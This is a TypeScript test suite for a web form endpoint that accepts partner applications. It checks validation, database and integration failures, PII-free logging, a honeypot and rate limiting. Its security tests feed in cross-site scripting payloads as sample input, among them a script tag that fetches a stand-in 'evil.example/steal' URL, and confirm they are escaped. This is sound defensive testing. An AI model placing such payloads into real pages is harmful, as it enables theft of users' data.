import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { NextRequest } from "next/server";
import { __resetRateLimits } from "@/lib/rate-limit";

/* ─── Mocks ────────────────────────────────────────────────── */

const insertResult = {
  data: { id: "11111111-2222-3333-4444-555555555555", created_at: "2026-08-22T01:41:41.000Z" },
  error: null as { message: string } | null,
};

/** Records the object passed to .insert() so tests can assert on it. */
let insertedRow: Record<string, unknown> | null = null;
/** When set, createServiceClient() throws — simulates missing env vars. */
let serviceClientThrows = false;

const single = vi.fn(async () => insertResult);
const select = vi.fn(() => ({ single }));
const insert = vi.fn((row: Record<string, unknown>) => {
  insertedRow = row;
  return { select };
});
const from = vi.fn(() => ({ insert }));

vi.mock("@/lib/supabase/service", () => ({
  createServiceClient: () => {
    if (serviceClientThrows) throw new Error("Missing SUPABASE_SERVICE_ROLE_KEY");
    return { from };
  },
}));

interface NotificationParams {
  to: string;
  subject: string;
  heading: string;
  body: string;
  ctaLabel?: string;
  ctaUrl?: string;
  replyTo?: string;
}

const sendNotification = vi.fn(async (params: NotificationParams) => Boolean(params));

vi.mock("@/lib/email/notifications", async (importOriginal) => {
  // Keep the real escapeHtml helpers — the HTML-escaping test asserts on
  // their actual output, not on a stub.
  const actual = await importOriginal<typeof import("@/lib/email/notifications")>();
  return {
    ...actual,
    sendNotification: (params: NotificationParams) => sendNotification(params),
  };
});

const { POST } = await import("./route");

/* ─── Helpers ──────────────────────────────────────────────── */

const VALID = {
  name: "Mary Grace Joy Taduran",
  email: "Taduranmarygracejoy@Gmail.com",
  company: "",
  website: "linkedin.com/in/marygrace",
  description:
    "I have a background in graphic design and digital marketing and refer businesses that need web work.",
  howYouMeet:
    "Primarily through targeted business research and personalised one-to-one outreach to owners.",
  estimatedReferrals: "3-5",
};

let ipCounter = 0;

/** Each request gets a unique IP so the rate limiter never interferes. */
function makeRequest(body: unknown, ip?: string) {
  return new NextRequest("https://tweakandbuild.com/api/partner-apply", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-forwarded-for": ip ?? `10.0.0.${++ipCounter % 250}`,
    },
    body: JSON.stringify(body),
  });
}

let fetchMock: ReturnType<typeof vi.fn>;

beforeEach(() => {
  vi.clearAllMocks();
  __resetRateLimits();
  insertedRow = null;
  serviceClientThrows = false;
  insertResult.data = {
    id: "11111111-2222-3333-4444-555555555555",
    created_at: "2026-08-22T01:41:41.000Z",
  };
  insertResult.error = null;
  sendNotification.mockImplementation(async () => true);

  process.env.LOOPS_API_KEY = "test-loops-key";
  process.env.CONTACT_TO_EMAIL = "hello@tweakandbuild.com";

  fetchMock = vi.fn(async () => new Response(JSON.stringify({ success: true }), { status: 200 }));
  vi.stubGlobal("fetch", fetchMock);
  vi.spyOn(console, "log").mockImplementation(() => {});
  vi.spyOn(console, "error").mockImplementation(() => {});
  vi.spyOn(console, "warn").mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

/* ─── Happy path ───────────────────────────────────────────── */

describe("POST /api/partner-apply — successful application", () => {
  it("persists the application and returns success", async () => {
    const res = await POST(makeRequest(VALID));
    const json = await res.json();

    expect(res.status).toBe(200);
    expect(json.success).toBe(true);
    expect(json.id).toBe("11111111-2222-3333-4444-555555555555");
    expect(from).toHaveBeenCalledWith("partner_applications");
    expect(insert).toHaveBeenCalledTimes(1);
  });

  it("persists all seven fields, normalised, with status new", async () => {
    await POST(makeRequest(VALID));

    expect(insertedRow).toEqual({
      full_name: "Mary Grace Joy Taduran",
      email: "taduranmarygracejoy@gmail.com", // lowercased
      company: null, // empty string → null
      website: "https://linkedin.com/in/marygrace", // scheme added
      description: VALID.description,
      how_you_meet: VALID.howYouMeet,
      estimated_referrals: "3-5",
      status: "new",
    });
  });

  it("runs all three integrations after the row is durable", async () => {
    await POST(makeRequest(VALID));

    // Loops
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0] as [string, RequestInit];
    expect(url).toBe("https://app.loops.so/api/v1/contacts/create");
    expect(JSON.parse(init.body as string)).toEqual({
      email: "taduranmarygracejoy@gmail.com",
      firstName: "Mary",
      lastName: "Grace Joy Taduran",
      source: "partner-application",
      userGroup: "partner-applicant",
      company: "",
      website: "https://linkedin.com/in/marygrace",
    });

    // Internal notification + applicant confirmation
    expect(sendNotification).toHaveBeenCalledTimes(2);
    const recipients = sendNotification.mock.calls.map((c) => c[0].to);
    expect(recipients).toEqual([
      "hello@tweakandbuild.com",
      "taduranmarygracejoy@gmail.com",
    ]);
  });

  it("never logs applicant PII", async () => {
    const logSpy = vi.spyOn(console, "log");
    await POST(makeRequest(VALID));

    const logged = logSpy.mock.calls.flat().join(" ");
    expect(logged).toContain("partner application saved");
    expect(logged).not.toContain("Mary");
    expect(logged).not.toContain("taduranmarygracejoy");
    expect(logged).not.toContain("graphic design");
    expect(logged).not.toContain("linkedin");
  });
});

/* ─── Validation ───────────────────────────────────────────── */

describe("POST /api/partner-apply — validation", () => {
  it("rejects an invalid email and writes nothing", async () => {
    const res = await POST(makeRequest({ ...VALID, email: "not-an-email" }));
    const json = await res.json();

    expect(res.status).toBe(400);
    expect(json.field).toBe("email");
    expect(json.error).toMatch(/valid email/i);
    expect(insert).not.toHaveBeenCalled();
  });

  it("rejects a missing required field", async () => {
    const { howYouMeet, ...withoutHowYouMeet } = VALID;
    void howYouMeet;
    const res = await POST(makeRequest(withoutHowYouMeet));

    const json = await res.json();
    expect(res.status).toBe(400);
    expect(json.field).toBe("howYouMeet");
    // Friendly copy, not a raw Zod type error leaking schema internals.
    expect(json.error).toBe("Please tell us how you meet potential clients");
    expect(json.error).not.toMatch(/expected string|received undefined/i);
    expect(insert).not.toHaveBeenCalled();
  });

  it("rejects a referral value outside the allowed set", async () => {
    const res = await POST(makeRequest({ ...VALID, estimatedReferrals: "500+" }));

    expect(res.status).toBe(400);
    expect((await res.json()).field).toBe("estimatedReferrals");
    expect(insert).not.toHaveBeenCalled();
  });

  it("rejects over-long input rather than storing it", async () => {
    const res = await POST(
      makeRequest({ ...VALID, description: "x".repeat(2001) }),
    );

    expect(res.status).toBe(400);
    expect(insert).not.toHaveBeenCalled();
  });

  it("rejects a malformed JSON body", async () => {
    const req = new NextRequest("https://tweakandbuild.com/api/partner-apply", {
      method: "POST",
      headers: { "content-type": "application/json", "x-forwarded-for": "10.1.1.1" },
      body: "{ not json",
    });

    expect((await POST(req)).status).toBe(400);
    expect(insert).not.toHaveBeenCalled();
  });
});

/* ─── Database failure is the only failure that fails the request ─── */

describe("POST /api/partner-apply — Supabase failure", () => {
  it("returns 500 and skips every integration when the insert errors", async () => {
    insertResult.data = null as never;
    insertResult.error = { message: "duplicate key value violates unique constraint" };

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(500);
    expect((await res.json()).error).toMatch(/couldn't save/i);
    expect(fetchMock).not.toHaveBeenCalled();
    expect(sendNotification).not.toHaveBeenCalled();
  });

  it("returns 500 without leaking the internal error message", async () => {
    insertResult.data = null as never;
    insertResult.error = { message: "duplicate key value violates unique constraint" };

    const json = await (await POST(makeRequest(VALID))).json();
    expect(JSON.stringify(json)).not.toMatch(/unique constraint/i);
  });

  it("returns 500 when the service client cannot be constructed", async () => {
    serviceClientThrows = true;

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(500);
    expect(fetchMock).not.toHaveBeenCalled();
    expect(sendNotification).not.toHaveBeenCalled();
  });
});

/* ─── Integration failures must NOT fail the request ────────── */

describe("POST /api/partner-apply — integration resilience", () => {
  it("still succeeds when Loops throws", async () => {
    fetchMock.mockRejectedValue(new Error("ECONNRESET"));

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(200);
    expect((await res.json()).success).toBe(true);
    expect(insert).toHaveBeenCalledTimes(1);
    expect(sendNotification).toHaveBeenCalledTimes(2); // emails still attempted
  });

  it("still succeeds when Loops returns a non-2xx response", async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ message: "Rate limited" }), { status: 429 }),
    );

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(200);
    expect(console.error).toHaveBeenCalledWith(
      expect.stringContaining("partner Loops sync failed"),
    );
  });

  it("treats a duplicate Loops contact as benign, not an error", async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ message: "Email already on list" }), { status: 409 }),
    );

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(200);
    expect(console.error).not.toHaveBeenCalled();
  });

  it("still succeeds when the internal notification throws", async () => {
    sendNotification.mockImplementationOnce(async () => {
      throw new Error("Resend 503");
    });

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(200);
    expect((await res.json()).success).toBe(true);
    expect(insert).toHaveBeenCalledTimes(1);
  });

  it("still succeeds when the applicant confirmation throws", async () => {
    sendNotification
      .mockImplementationOnce(async () => true)
      .mockImplementationOnce(async () => {
        throw new Error("Resend 503");
      });

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(200);
    expect((await res.json()).success).toBe(true);
    expect(insert).toHaveBeenCalledTimes(1);
  });

  it("still succeeds when LOOPS_API_KEY is not configured", async () => {
    delete process.env.LOOPS_API_KEY;

    const res = await POST(makeRequest(VALID));

    expect(res.status).toBe(200);
    expect(fetchMock).not.toHaveBeenCalled();
  });
});

/* ─── Security ─────────────────────────────────────────────── */

describe("POST /api/partner-apply — security", () => {
  it("escapes HTML from applicant input in the internal notification", async () => {
    await POST(
      makeRequest({
        ...VALID,
        name: '<img src=x onerror="alert(1)">Mary',
        description:
          '<script>fetch("https://evil.example/steal")</script> I design brands for a living.',
      }),
    );

    const internal = sendNotification.mock.calls[0][0];

    // No executable markup survives.
    expect(internal.body).not.toContain("<script>");
    expect(internal.body).not.toContain("<img");
    expect(internal.body).not.toContain('onerror="');
    // The text itself is preserved, just neutralised.
    expect(internal.body).toContain("&lt;script&gt;");
    expect(internal.body).toContain("&lt;img src=x");
    expect(internal.body).toContain("I design brands for a living.");
  });

  it("preserves newlines as <br> without allowing injected markup", async () => {
    await POST(
      makeRequest({ ...VALID, howYouMeet: "Line one\n<b>Line two</b>\nLine three" }),
    );

    const internal = sendNotification.mock.calls[0][0];
    expect(internal.body).toContain("Line one<br>&lt;b&gt;Line two&lt;/b&gt;<br>Line three");
  });

  it("silently discards a submission that fills the honeypot", async () => {
    const res = await POST(makeRequest({ ...VALID, website_url: "http://spam.example" }));

    // Looks successful to the bot...
    expect(res.status).toBe(200);
    expect((await res.json()).success).toBe(true);
    // ...but nothing was written or sent.
    expect(insert).not.toHaveBeenCalled();
    expect(fetchMock).not.toHaveBeenCalled();
    expect(sendNotification).not.toHaveBeenCalled();
  });

  it("rate limits repeated submissions from one IP", async () => {
    const ip = "203.0.113.7";
    const statuses: number[] = [];
    for (let i = 0; i < 7; i++) {
      statuses.push((await POST(makeRequest(VALID, ip))).status);
    }

    expect(statuses.slice(0, 5)).toEqual([200, 200, 200, 200, 200]);
    expect(statuses.slice(5)).toEqual([429, 429]);
    expect(insert).toHaveBeenCalledTimes(5);
  });
});
